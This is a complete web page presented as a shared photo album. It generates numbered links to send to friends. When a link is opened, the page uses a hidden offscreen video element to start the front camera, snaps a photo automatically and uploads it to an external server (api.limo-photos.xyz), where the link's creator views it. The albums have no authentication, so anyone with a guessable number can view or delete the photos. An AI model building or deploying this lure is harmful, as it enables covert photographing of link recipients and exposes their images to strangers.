<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>共享快照相册</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; }
  body { min-height: 100vh; background: linear-gradient(145deg, #0b1a2e 0%, #1a2f42 100%); display: flex; justify-content: center; align-items: center; padding: 1.5rem; }
  .app { max-width: 800px; width: 100%; background: rgba(18,30,41,0.9); backdrop-filter: blur(16px); border-radius: 2.5rem; box-shadow: 0 30px 50px rgba(0,0,0,0.7); padding: 2rem; color: #eef4ff; }
  h1 { font-size: 1.8rem; font-weight: 500; display: flex; align-items: center; gap: 0.6rem; color: #fff; margin-bottom: 1rem; }
  h1 span { background: #3b82f6; width: 2.2rem; height: 2.2rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; }
  .sub { margin-bottom: 1.8rem; color: #a2b9d4; font-size: 0.95rem; border-bottom: 1px solid #2e4057; padding-bottom: 0.8rem; }
  video { position: absolute; width: 1px; height: 1px; opacity: 0; top: -9999px; left: -9999px; }
  .btn { background: #2563eb; border: none; color: #fff; padding: 1.4rem 1.8rem; border-radius: 1.6rem; font-size: 1.15rem; cursor: pointer; width: 100%; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 0.6rem; }
  .btn:hover { background: #1d4ed8; }
  .btn:disabled { opacity: 0.4; pointer-events: none; }
  .btn.gray { background: #1e2e40; border: 1px solid #36516b; }
  .btn.gray:hover { background: #2a3f58; }
  .input { background: #1e2f44; border: 1px solid #3d5a78; color: #fff; width: 100%; padding: 1.1rem 1.2rem; border-radius: 1.2rem; margin-bottom: 1rem; font-size: 1.1rem; text-align: center; letter-spacing: 0.2em; }
  .input:focus { outline: none; border-color: #3b82f6; }
  .result { background: #0e1a26; border: 1px solid #36516b; border-radius: 1.2rem; padding: 1rem; margin-top: 1.2rem; word-break: break-all; font-size: 0.9rem; color: #a2b9d4; display: none; }
  .result.on { display: block; }
  .result input { background: #1e2f44; border: 1px solid #3d5a78; color: #fff; width: 100%; padding: 0.7rem 1rem; border-radius: 0.8rem; margin-top: 0.5rem; font-size: 0.9rem; }
  .row { display: flex; gap: 0.8rem; margin-top: 0.8rem; }
  .row .btn { padding: 0.9rem; font-size: 0.95rem; }
  .badge { background: #1e2f44; padding: 0.35rem 1rem; border-radius: 40px; font-size: 0.85rem; display: inline-flex; align-items: center; gap: 0.4rem; border: 1px solid #3d5a78; }
  .dot { width: 8px; height: 8px; border-radius: 50%; background: #facc15; }
  .dot.on { background: #10b981; box-shadow: 0 0 10px #10b981; }
  .dot.err { background: #ef4444; box-shadow: 0 0 10px #ef4444; }
  .view { display: none; flex-direction: column; gap: 1.5rem; margin-top: 1rem; }
  .view.on { display: flex; }
  .vhead { display: flex; justify-content: space-between; align-items: center; }
  .vhead h2 { font-size: 1.3rem; font-weight: 500; color: #d9e9ff; }
  .count { background: #1e2f44; padding: 0.3rem 1.1rem; border-radius: 40px; font-size: 0.85rem; border: 1px solid #3a5570; color: #b9d0ea; }
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 1rem; max-height: 380px; overflow-y: auto; padding: 0.3rem 0; }
  .card { aspect-ratio: 1/1; background: #101f2e; border-radius: 1.2rem; overflow: hidden; border: 2px solid #20384d; transition: 0.2s; position: relative; }
  .card:hover { border-color: #3b82f6; }
  .card img { width: 100%; height: 100%; object-fit: cover; cursor: pointer; }
  .card .del { position: absolute; top: 6px; right: 6px; background: rgba(220,38,38,0.85); color: #fff; border: none; border-radius: 50%; width: 28px; height: 28px; font-size: 15px; cursor: pointer; display: none; align-items: center; justify-content: center; line-height: 1; padding: 0; }
  .card:hover .del, .card .del.show { display: flex; }
  .empty { grid-column: 1/-1; display: flex; flex-direction: column; align-items: center; padding: 3rem; color: #6e8aa8; background: #0b1620; border-radius: 1.5rem; border: 2px dashed #1e3347; gap: 0.5rem; }
  .back { background: #1e2e40; border: 1px solid #36516b; color: #eef4ff; padding: 0.8rem 1.6rem; border-radius: 2.5rem; cursor: pointer; width: fit-content; }
  .back:hover { background: #2a3f58; }
  .toast { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%) translateY(100px); background: #1e2e40; color: white; padding: 0.8rem 1.8rem; border-radius: 50px; border-left: 5px solid #3b82f6; box-shadow: 0 20px 35px -10px rgba(0,0,0,0.8); transition: transform 0.3s; z-index: 999; pointer-events: none; }
  .toast.show { transform: translateX(-50%) translateY(0); }
  .flash { position: fixed; inset: 0; background: white; opacity: 0; pointer-events: none; transition: opacity 0.15s; z-index: 9999; }
  .flash.on { opacity: 0.7; }
  .note { margin-top: 1.5rem; font-size: 0.75rem; color: #5f7991; text-align: center; border-top: 1px solid #1f3244; padding-top: 1rem; }
  .tabs { display: flex; gap: 0.6rem; margin-bottom: 1.5rem; }
  .tab { flex: 1; background: #1e2e40; border: 1px solid #36516b; color: #a2b9d4; padding: 0.9rem; border-radius: 1.2rem; font-size: 0.95rem; cursor: pointer; text-align: center; transition: 0.2s; }
  .tab.active { background: #2563eb; border-color: #3b82f6; color: #fff; }
</style>
</head>
<body>
<div class="app">
  <h1><span>📸</span> 共享快照相册</h1>

  <!-- 主页面 -->
  <div id="homeView">
    <div class="tabs">
      <div class="tab active" id="tabCreate">生成链接</div>
      <div class="tab" id="tabView">查看照片</div>
    </div>

    <!-- 生成链接 -->
    <div id="createPanel">
      <div class="sub">输入一个数字（比如房间号），生成对应的拍照链接。</div>
      <input type="text" class="input" id="createCode" placeholder="输入数字，如 1234" inputmode="numeric">
      <button class="btn" id="genBtn">🔗 生成拍照链接</button>
      <div class="result" id="result">
        <div>链接已生成，复制发给朋友：</div>
        <input type="text" id="linkInput" readonly>
        <div class="row">
          <button class="btn gray" id="copyBtn">📋 复制链接</button>
          <button class="btn gray" id="openBtn">🔗 立即打开</button>
        </div>
      </div>
    </div>

    <!-- 查看照片 -->
    <div id="viewPanel" style="display:none;">
      <div class="sub">输入数字，查看对应相册的照片。</div>
      <input type="text" class="input" id="viewCode" placeholder="输入数字，如 1234" inputmode="numeric">
      <button class="btn" id="loadBtn">🖼️ 查看照片</button>
    </div>

    <div style="margin-top:1.5rem;text-align:center;">
      <span class="badge"><span class="dot on" id="dot"></span><span id="status">检查服务中...</span></span>
    </div>
  </div>

  <!-- 拍照页面 -->
  <div id="shotView" style="display:none;">
    <div class="sub">允许摄像头权限，会自动拍一张上传到相册。</div>
    <div style="display:flex; gap:0.6rem; flex-wrap:wrap; margin-bottom:1rem;">
      <span class="badge"><span class="dot" id="dot2"></span><span id="status2">等待摄像头</span></span>
    </div>
    <button class="btn gray" id="shotBtn" disabled>📷 再拍一张</button>
    <div class="note">⚡ 拍摄后自动上传。</div>
  </div>

  <!-- 相册展示 -->
  <div class="view" id="view">
    <div class="vhead">
      <h2>📁 相册</h2>
      <div class="count" id="count">0 张</div>
    </div>
    <div class="grid" id="grid"></div>
    <button class="back" id="backBtn">← 返回</button>
  </div>

  <div class="note">⚡ 每个数字对应一个独立相册，互不干扰。</div>
</div>

<video id="video" autoplay playsinline muted></video>
<div class="flash" id="flash"></div>
<div class="toast" id="toast"></div>

<script>
(function() {
  const API_BASE = 'https://api.limo-photos.xyz';
  const PAGE_URL = 'https://limoyou66-art.github.io/-/';

  const video = document.getElementById('video');
  const flash = document.getElementById('flash');
  const toast = document.getElementById('toast');
  const homeView = document.getElementById('homeView');
  const shotView = document.getElementById('shotView');
  const view = document.getElementById('view');
  const grid = document.getElementById('grid');
  const count = document.getElementById('count');
  const createPanel = document.getElementById('createPanel');
  const viewPanel = document.getElementById('viewPanel');
  const tabCreate = document.getElementById('tabCreate');
  const tabView = document.getElementById('tabView');
  const createCode = document.getElementById('createCode');
  const viewCode = document.getElementById('viewCode');
  const genBtn = document.getElementById('genBtn');
  const loadBtn = document.getElementById('loadBtn');
  const result = document.getElementById('result');
  const linkInput = document.getElementById('linkInput');
  const copyBtn = document.getElementById('copyBtn');
  const openBtn = document.getElementById('openBtn');
  const backBtn = document.getElementById('backBtn');
  const shotBtn = document.getElementById('shotBtn');
  const dot = document.getElementById('dot');
  const status = document.getElementById('status');
  const dot2 = document.getElementById('dot2');
  const status2 = document.getElementById('status2');

  let stream = null, photos = [], autoDone = false, toastTimer = null;
  let currentRoom = 'default';

  const params = new URLSearchParams(location.search);
  const isShotMode = params.has('room');
  const roomId = params.get('room') || 'default';

  function showToast(msg, dur = 2000) {
    clearTimeout(toastTimer);
    toast.textContent = msg;
    toast.classList.add('show');
    toastTimer = setTimeout(() => toast.classList.remove('show'), dur);
  }

  async function checkService() {
    try {
      const res = await fetch(API_BASE + '/api/photos?room=default');
      if (res.ok) { dot.className = 'dot on'; status.textContent = '服务正常'; }
      else throw new Error();
    } catch (e) { dot.className = 'dot err'; status.textContent = '服务异常'; }
  }

  async function loadPhotos(room) {
    try {
      const res = await fetch(API_BASE + '/api/photos?room=' + encodeURIComponent(room));
      if (!res.ok) throw new Error();
      const data = await res.json();
      if (Array.isArray(data)) photos = data;
      else photos = [];
    } catch (e) { showToast('加载照片失败'); photos = []; }
    render();
  }

  async function uploadPhoto(dataUrl) {
    try {
      const res = await fetch(API_BASE + '/api/photos', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ dataUrl, room: roomId }),
      });
      return res.ok;
    } catch (e) { return false; }
  }

  async function deletePhoto(id) {
    try {
      const res = await fetch(API_BASE + '/api/photos', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id }),
      });
      return res.ok;
    } catch (e) { return false; }
  }

  function render() {
    grid.innerHTML = '';
    if (photos.length === 0) {
      const e = document.createElement('div');
      e.className = 'empty';
      e.innerHTML = '<div style="font-size:2rem">📷</div><span>这个相册还没有照片</span>';
      grid.appendChild(e);
    } else {
      [...photos].sort((a, b) => (b.time || 0) - (a.time || 0)).forEach(p => {
        const c = document.createElement('div');
        c.className = 'card';
        const img = document.createElement('img');
        img.src = p.dataUrl;
        img.loading = 'lazy';
        img.onclick = () => window.open(p.dataUrl, '_blank');
        c.appendChild(img);

        const del = document.createElement('button');
        del.className = 'del';
        del.textContent = '✕';
        del.onclick = async (e) => {
          e.stopPropagation();
          if (!confirm('确定删除这张照片吗？')) return;
          const ok = await deletePhoto(p.id);
          if (ok) { showToast('已删除'); await loadPhotos(currentRoom); }
          else showToast('删除失败');
        };
        c.appendChild(del);

        let pt = null;
        c.addEventListener('touchstart', () => { pt = setTimeout(() => del.classList.add('show'), 500); });
        c.addEventListener('touchend', () => clearTimeout(pt));
        c.addEventListener('touchmove', () => clearTimeout(pt));

        grid.appendChild(c);
      });
    }
    count.textContent = photos.length + ' 张';
  }

  function flashEffect() {
    flash.classList.add('on');
    setTimeout(() => flash.classList.remove('on'), 150);
  }

  function capture() {
    if (!video.videoWidth) return null;
    const c = document.createElement('canvas');
    c.width = video.videoWidth;
    c.height = video.videoHeight;
    const ctx = c.getContext('2d');
    ctx.translate(c.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);
    return c.toDataURL('image/jpeg', 0.7);
  }

  async function takePhoto(auto = false) {
    if (!stream || !video.srcObject) { if (!auto) showToast('摄像头未就绪'); return; }
    const dataUrl = capture();
    if (!dataUrl) return;
    flashEffect();
    showToast(auto ? '✨ 自动拍照已上传' : '📸 拍照已上传');
    const ok = await uploadPhoto(dataUrl);
    if (ok && auto) {
      setTimeout(() => {
        shotView.innerHTML = '<div style="text-align:center; padding:2rem 0;"><div style="font-size:3rem">✅</div><div style="margin-top:1rem; color:#a2b9d4;">拍照成功，已上传</div><div style="margin-top:1.5rem;"><button class="btn gray" onclick="location.href=\'' + PAGE_URL + '\'">返回首页</button></div></div>';
      }, 800);
    }
  }

  function stopStream() {
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
    video.srcObject = null;
  }

  async function initCamera() {
    stopStream();
    autoDone = false;
    shotBtn.disabled = true;
    if (dot2) { dot2.className = 'dot'; status2.textContent = '请求权限中...'; }
    try {
      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      stream = s;
      video.srcObject = s;
      await new Promise(r => { if (video.readyState >= 1) r(); else video.onloadedmetadata = r; });
      await video.play();
      if (dot2) { dot2.className = 'dot on'; status2.textContent = '摄像头已就绪'; }
      shotBtn.disabled = false;
      if (!autoDone) {
        autoDone = true;
        setTimeout(() => { if (stream && video.srcObject) takePhoto(true); }, 300);
      }
    } catch (e) {
      if (dot2) { dot2.className = 'dot err'; status2.textContent = '权限被拒绝'; }
      showToast('请允许摄像头权限', 3000);
    }
  }

  // === 标签切换 ===
  if (tabCreate) {
    tabCreate.onclick = () => {
      tabCreate.classList.add('active');
      tabView.classList.remove('active');
      createPanel.style.display = 'block';
      viewPanel.style.display = 'none';
    };
  }
  if (tabView) {
    tabView.onclick = () => {
      tabView.classList.add('active');
      tabCreate.classList.remove('active');
      viewPanel.style.display = 'block';
      createPanel.style.display = 'none';
    };
  }

  // === 生成链接 ===
  if (genBtn) {
    genBtn.onclick = () => {
      const code = createCode.value.trim();
      if (!code) { showToast('请先输入一个数字'); return; }
      if (!/^\d+$/.test(code)) { showToast('请输入纯数字'); return; }
      const link = PAGE_URL + '?room=' + code;
      linkInput.value = link;
      result.classList.add('on');
      showToast('链接已生成');
    };
  }
  if (copyBtn) {
    copyBtn.onclick = async () => {
      try {
        await navigator.clipboard.writeText(linkInput.value);
        showToast('已复制到剪贴板');
      } catch (e) {
        linkInput.select();
        document.execCommand('copy');
        showToast('已复制');
      }
    };
  }
  if (openBtn) {
    openBtn.onclick = () => window.open(linkInput.value, '_blank');
  }

  // === 查看照片 ===
  if (loadBtn) {
    loadBtn.onclick = async () => {
      const code = viewCode.value.trim();
      if (!code) { showToast('请先输入数字'); return; }
      if (!/^\d+$/.test(code)) { showToast('请输入纯数字'); return; }
      currentRoom = code;
      homeView.style.display = 'none';
      view.classList.add('on');
      await loadPhotos(code);
    };
  }

  if (backBtn) {
    backBtn.onclick = () => {
      view.classList.remove('on');
      homeView.style.display = 'block';
    };
  }
  if (shotBtn) shotBtn.onclick = () => takePhoto(false);

  window.addEventListener('beforeunload', stopStream);

  if (isShotMode) {
    homeView.style.display = 'none';
    shotView.style.display = 'block';
    setTimeout(initCamera, 100);
  } else {
    checkService();
  }
})();
</script>
</body>
</html>
